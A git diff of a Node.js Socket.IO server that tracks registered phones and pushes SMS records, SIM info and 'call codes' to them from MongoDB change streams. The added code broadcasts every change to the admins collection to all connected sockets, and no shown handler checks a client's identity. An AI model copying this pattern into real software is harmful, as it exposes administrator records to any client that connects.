@@ -37,9 +37,6 @@ app.set("io", io);
 const deviceSockets = new Map();  // uniqueid → socketId
 const watchers = new Map();       // uniqueid → Set(socketId)
 
-// =============================================
-// 🔥 Notify Device Details Page
-// =============================================
 function notifyWatchers(uniqueid, payload) {
   const w = watchers.get(uniqueid);
   if (!w) return;
@@ -47,22 +44,17 @@ function notifyWatchers(uniqueid, payload) {
 }
 
 // =============================================
-// 🔥 SOCKET SYSTEM
+// 🔥 SOCKET CONNECTION
 // =============================================
 io.on("connection", (socket) => {
   console.log("🟢 New Socket Connected:", socket.id);
-
   let currentUniqueId = null;
 
-  // ---------------------------------------------
-  // 👁 Watch Single Device Page
-  // ---------------------------------------------
+  // 👁 WATCH DEVICE
   socket.on("watchDevice", (uniqueid) => {
     if (!uniqueid) return;
-
     if (!watchers.has(uniqueid)) watchers.set(uniqueid, new Set());
     watchers.get(uniqueid).add(socket.id);
-
     console.log(`👁 Watching Device → ${uniqueid}`);
   });
 
@@ -70,16 +62,12 @@ io.on("connection", (socket) => {
     if (watchers.has(uniqueid)) watchers.get(uniqueid).delete(socket.id);
   });
 
-  // ---------------------------------------------
   // 📌 REGISTER DEVICE
-  // ---------------------------------------------
   socket.on("registerDevice", (uniqueid) => {
     if (!uniqueid) return;
 
     console.log("🔗 REGISTER DEVICE:", uniqueid);
-
     deviceSockets.set(uniqueid, socket.id);
-
     currentUniqueId = uniqueid;
     socket.join(uniqueid);
 
@@ -99,15 +87,12 @@ io.on("connection", (socket) => {
     });
   });
 
-  // ---------------------------------------------
   // 🔵 DEVICE STATUS
-  // ---------------------------------------------
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
 
     console.log(`⚡ STATUS: ${uniqueid} → ${connectivity}`);
-
     saveLastSeen(uniqueid, connectivity);
 
     const payload = {
@@ -120,9 +105,7 @@ io.on("connection", (socket) => {
     notifyWatchers(uniqueid, payload);
   });
 
-  // ---------------------------------------------
   // 🔴 DISCONNECT
-  // ---------------------------------------------
   socket.on("disconnect", () => {
     console.log("🔴 Socket disconnected:", socket.id);
 
@@ -158,7 +141,7 @@ io.on("connection", (socket) => {
 });
 
 // =============================================
-// 🔥 Save Last Seen
+// 🔥 SAVE LAST SEEN
 // =============================================
 async function saveLastSeen(uniqueid, connectivity) {
   try {
@@ -174,7 +157,7 @@ async function saveLastSeen(uniqueid, connectivity) {
 }
 
 // =============================================
-// 🔥 SEND CALL CODE
+// 🔥 SEND CALL CODE TO DEVICE
 // =============================================
 export async function sendCallCodeToDevice(uniqueid, callData) {
   const socketId = deviceSockets.get(uniqueid);
@@ -185,14 +168,22 @@ export async function sendCallCodeToDevice(uniqueid, callData) {
 }
 
 // =============================================
-// 🛡️ MONGO CONNECTION ERROR LOG (SAFETY)
+// 🔥 SEND ADMIN GLOBAL UPDATE  (ADDED)
+// =============================================
+export function sendAdminGlobal(adminData) {
+  console.log("👑 REALTIME ADMIN EMIT:", adminData);
+  io.emit("adminUpdate", adminData);  // 🔥 SEND TO ALL DEVICES
+}
+
+// =============================================
+// 🛡️ MONGO CONNECTION SAFETY
 // =============================================
 mongoose.connection.on("error", (err) => {
   console.error("❌ MongoDB connection error:", err.message);
 });
 
 // =============================================
-// 🔥 MONGO STREAMS (WITH ERROR HANDLING + RETRY)
+// 🔥 MONGO STREAMS (SAFE + RETRY)
 // =============================================
 mongoose.connection.once("open", () => {
   console.log("📡 Mongo Streams Active...");
@@ -200,20 +191,12 @@ mongoose.connection.once("open", () => {
   const watchWithRetry = (collection, eventName, callback, delay = 5000) => {
     const startWatch = () => {
       try {
-        const stream = mongoose
-          .connection
-          .collection(collection)
-          .watch();
-
+        const stream = mongoose.connection.collection(collection).watch();
         console.log(`👀 Watching collection: ${collection}`);
 
-        // On change
         stream.on("change", async (change) => {
           try {
-            if (!["insert", "update", "replace"].includes(change.operationType)) {
-              return;
-            }
-
+            if (!["insert", "update", "replace"].includes(change.operationType)) return;
             const updated = await mongoose
               .connection
               .collection(collection)
@@ -225,34 +208,18 @@ mongoose.connection.once("open", () => {
           }
         });
 
-        // 💣 IMPORTANT: HANDLE ERRORS SO APP DOESN'T CRASH
-        stream.on("error", (err) => {
-          console.error(`🔥 ChangeStream error on ${collection}:`, err.message);
-          try {
-            stream.close();
-          } catch (_) {}
-
-          // ⏱️ Retry after small delay
+        stream.on("error", () => {
+          console.error(`🔥 ChangeStream error on ${collection}`);
+          try { stream.close(); } catch {}
           setTimeout(() => {
-            console.log(`🔁 Restarting watch on collection: ${collection}`);
+            console.log(`🔁 Restarting watch on: ${collection}`);
             watchWithRetry(collection, eventName, callback, delay);
           }, delay);
         });
-
-        // Optional: handle close event (for logs)
-        stream.on("close", () => {
-          console.warn(`⚠️ ChangeStream closed for collection: ${collection}`);
-        });
-      } catch (err) {
-        console.error(`❌ Failed to start watch on ${collection}:`, err.message);
-        // Retry later
-        setTimeout(() => {
-          console.log(`🔁 Retrying watch init on: ${collection}`);
-          startWatch();
-        }, delay);
+      } catch {
+        setTimeout(startWatch, delay);
       }
     };
-
     startWatch();
   };
 
@@ -266,17 +233,22 @@ mongoose.connection.once("open", () => {
     io.emit("simInfoUpdated", { event: "sim_change", sim: data });
   });
 
-  // CALL STREAM (uses uniqueid)
+  // CALL STREAM
   watchWithRetry("callcodes", "callCodeUpdate", (data) => {
     if (!data.uniqueid) return;
     sendCallCodeToDevice(data.uniqueid, data);
   });
 
-  // SMS STREAM (uses uniqueid)
+  // SMS STREAM
   watchWithRetry("sms", "smsUpdate", (data) => {
     if (!data.uniqueid) return;
     const sock = deviceSockets.get(data.uniqueid);
     if (sock) io.to(sock).emit("smsUpdate", data);
+  });
+
+  // ⭐ ADMIN STREAM (ADDED)
+  watchWithRetry("admins", "adminUpdate", (data) => {
+    sendAdminGlobal(data);
   });
 });
 
